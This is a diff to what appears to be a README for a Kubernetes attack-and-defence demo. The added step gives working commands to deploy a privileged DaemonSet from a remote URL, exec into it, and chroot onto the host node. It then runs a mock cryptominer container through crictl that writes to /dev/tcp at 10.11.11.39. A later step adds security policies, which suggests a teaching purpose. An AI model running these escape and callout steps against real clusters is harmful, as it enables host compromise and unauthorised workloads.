@@ -163,11 +163,54 @@ EOF
 ./kubectl --kubeconfig=config get pods -A
 ```
 
+7. Perform lateral movement (Escapte pod using privileged container)
+```
+# install privileged container with hostPath mount 
+./kubectl --kubeconfig=config apply -f https://raw.githubusercontent.com/handfields/go-rce-kubernetes/main/06-priv-daemonset.yaml
 
+# exec into pod 
+./kubectl --kubeconfig=config exec $(./kubectl --kubeconfig=config get pods -n mallory -o=jsonpath={.items[0].metadata.name}) -it -n mallory /bin/bash 
 
+# go to hostPath mount and change root 
+cd /host && chroot . 
 
-7. Perform lateral movement
-
+# run fake cryptominer example (debian)
+cat <<EOF > container.json
+{
+  "metadata": {
+      "name": "mine"
+  },
+  "image":{
+      "image": "debian:buster-slim"
+  },
+  "command": [
+      "echo"
+  ],
+  "args": [ 
+    "money",
+    ">", 
+    "/dev/tcp/10.11.11.39/8445"
+  ],
+  "log_directory": "/tmp",
+  "linux": {
+  }
+}
+EOF
+cat <<EOF > pod.json
+{
+  "metadata": {
+    "name": "mine",
+    "namespace": "default",
+    "attempt": 5,
+    "uid": "hdishd83djaidwnduwk28bcsb"
+  },
+  "log_path":"busybox.0.log",
+  "linux": {
+  }
+}
+EOF
+crictl run container.json pod.json
+```
 
 8. Add security policies 
 
